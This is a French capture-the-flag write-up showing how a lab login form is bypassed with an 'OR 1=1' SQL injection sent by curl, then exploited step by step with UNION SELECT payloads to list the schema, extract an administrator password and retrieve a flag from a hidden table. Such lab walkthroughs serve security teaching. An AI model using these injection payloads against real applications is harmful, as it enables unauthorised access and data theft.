# Comme dans un Moul'1

> Ici les exemples sont exploités avec curl, mais bien entendu cela fonctionne tout aussi bien directement avec le formulaire dans le navigateur  

## Partie 1

Ici, on est face à un formulaire.  
Le premier réflexe pourrait être de tester si les inputs sont protégés contre les injections :

```
curl -s "https://moulin.ctf.ineat.fr/" --data "username=' OR 1=1 LIMIT 1#&password=" | grep INEAT
```

refexe somme toute plutôt efficace je dois dire : `<h1 class="corb-flag">INEAT{c0nn3xi0n_v4lid33}</h1>`

## Partie 2

> Cette méthode n'est certes pas la plus simple, mais elle a le mérite de retracer un peu plus en détail un scema d'exploitation d'injection SQL ;)

On est donc ici face au même site que le précédent. Il faut donc trouver une méthode pour exploiter ça un peu plus en profondeur.
Partons donc à la recherche des colonnes de notre bdd :

```
curl -s "https://moulin.ctf.ineat.fr/" --data "username=' UNION SELECT 1 #&password=" | grep INEAT
```

Parfait, notre champ username est donc injectable : `Bienvenue 1!`  
On peut maintenant commencer à retrouver la structure de notre bdd au travers de ce champ :

```text
' UNION SELECT user() #
 <-- level2@172.27.0.3 --> 
 
' UNION SELECT database() #
<-- level2 -->

' UNION SELECT table_schema FROM information_schema.tables WHERE table_schema != 'information_schema' #
<-- level 2 -->

' UNION SELECT table_name FROM information_schema.columns WHERE column_name = 'username' #
<-- users -->

' UNION SELECT username FROM users WHERE 1=1 LIMIT 1 #
<-- administrator -->

' UNION SELECT password FROM users WHERE username = 'administrator' #
<-- Bienvenue this is a very complexe password! So proud :)! -->
```

Rien de très intéresant de ce côté, on va donc chercher une table qui contiendrait un champ "flag"

```text
' UNION SELECT table_name FROM information_schema.columns WHERE column_name = 'flag' LIMIT 0,1#
<-- INNODB_SYS_TABLES -->

' UNION SELECT table_name FROM information_schema.columns WHERE column_name = 'flag' LIMIT 1,2#
<-- INNODB_SYS_TABLESPACES -->

' UNION SELECT table_name FROM information_schema.columns WHERE column_name = 'flag' LIMIT 2,3#
<-- my_secret_table -->
```

Ah, on tiens quelque chose d'intéressant (qu'on aurait pu avoir un peu plus tôt si on avait été un peu patient, j'en convient..)  
On peut vérifier que notre table a bien un colonne "flag" pour en avoir le coeur net :

 ```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'my_secret_table' #
<-- flag -->
```

On peut donc récupérer le flag
```
' UNION SELECT flag FROM my_secret_table #
<-- INEAT{U_f1nD_th3_s3cret_T4ble} -->
```
